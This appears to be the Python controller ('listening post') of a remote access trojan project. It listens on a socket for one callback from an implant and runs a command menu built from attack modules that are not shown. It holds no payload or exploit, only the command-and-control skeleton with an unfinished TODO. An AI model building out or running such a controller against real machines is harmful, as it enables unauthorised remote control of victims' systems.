import argparse
import socket
import worker
import menu
import sys
from modules import *
from modules import mod_funcs
from globals import rat_ctx

def main():
    parser = argparse.ArgumentParser(description='LP options')
    parser.add_argument('-l', '--log', type=str, default="logs", help="Logging directory")
    parser.add_argument('ip', type=str, nargs='?', default="127.0.0.1", help="Interface to listen on")
    parser.add_argument('port', type=int, nargs='?', default=5555, help="Port to listen on")
    args = parser.parse_args()

    # Build menu by dynamnically importing all modules and assigning
    # their entrypoints as do_ functions so they are populated in the menu
    # automagically

    cmd_menu = menu.Menu()
    for module in mod_funcs:
        setattr(type(cmd_menu), 'do_' + module, globals()[module].entrypoint)

    # TODO Build out rat_ctx, need to track module ids

    print(f"Waitng for connection on {args.ip}:{args.port}")
    listen_sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    listen_sock.bind((args.ip, args.port))
    listen_sock.listen(5)

    # Accept connection and pass off to worker thread
    conn = listen_sock.accept()

    # Should only be expecting one callback
    listen_sock.close()
    
    worker_thread = worker.Worker(conn[0])
    worker_thread.start()

    try:
        cmd_menu.cmdloop()

    except KeyboardInterrupt as e:
        worker_thread.stop = True
        sys.exit(-1)
    

if __name__ == '__main__':
    main()